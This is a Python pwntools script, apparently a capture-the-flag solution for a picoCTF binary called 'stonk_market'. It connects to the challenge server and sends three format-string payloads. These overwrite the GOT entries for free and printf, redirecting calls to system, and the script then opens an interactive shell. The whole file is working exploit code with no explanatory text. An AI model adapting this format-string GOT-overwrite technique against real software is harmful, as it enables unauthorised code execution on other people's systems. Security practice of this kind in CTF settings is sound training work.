from pwn import *
e = ELF('./stonk_market')
#r = process('./stonk_market')
r = remote('mercury.picoctf.net', 5654)
context(arch='amd64', os='linux')

payload = ('%c'*(5+7-2) + f"%{e.got['free']-10}c%lln" + '%c'*(8-2) + f"%{((e.sym['buy_stonks'] - e.got['free'])%(0xffff+1))-6}c%hn").encode()
print(payload)
r.sendline(b'1')
r.sendline(payload)

payload = (f"%{e.got['printf']}c%12$lln").encode()
print(payload)
r.sendline(b'1')
r.sendline(payload)

payload = (f"%{e.plt['system']}c%18$lln").encode()
print(payload)
r.sendline(b'1')
r.sendline(payload)

r.interactive()
